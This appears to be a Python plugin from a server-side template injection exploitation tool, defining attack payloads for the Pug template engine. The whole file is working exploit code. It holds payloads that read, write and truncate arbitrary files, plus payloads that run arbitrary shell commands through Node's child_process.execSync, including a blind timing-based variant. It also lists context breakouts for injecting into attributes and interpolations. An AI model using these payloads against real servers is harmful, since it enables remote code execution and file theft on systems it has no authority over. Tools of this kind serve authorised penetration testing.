from plugins.languages import javascript


class Pug(javascript.Javascript):
    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': '\n= {code}\n',
                'header': '\n= {header}\n',
                'trailer': '\n= {trailer}\n',
            },
            # No evaluate_blind here, since we've no sleep, we'll use inject
            'write': {
                'call': 'inject',
                # Payloads calling inject must start with \n to break out already started lines
                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64'), 'binary')
""",
                'truncate': """\n- global.process.mainModule.require('fs').writeFileSync('{path}', '')
"""
            },
            'read': {
                'call': 'render',
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'call': 'render',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind': {
                'call': 'inject',
                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                # TODO: use another function.
                # Payloads calling inject must start with \n to break out already started lines
                # It's two lines command to avoid false positive with Javascript module
                'execute_blind': """
- x = global.process.mainModule.require
- x('child_process').execSync(Buffer('{code_b64}', 'base64').toString() + ' && sleep {delay}')
"""
            },
            'execute': {
                'call': 'render',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64').toString())"""
            },
            'evaluate': {
                'test_os': """global.process.mainModule.require('os').platform()"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # Attribute close a(href=\'%s\')
            {'level': 1, 'prefix': '{closure})', 'suffix': '//', 'closures': {1: javascript.ctx_closures[1]}},
            # String interpolation #{
            {'level': 2, 'prefix': '{closure}}}', 'suffix': '//', 'closures': javascript.ctx_closures},
            # Code context
            {'level': 2, 'prefix': '{closure}\n', 'suffix': '//', 'closures': javascript.ctx_closures},
        ])

    language = 'javascript'
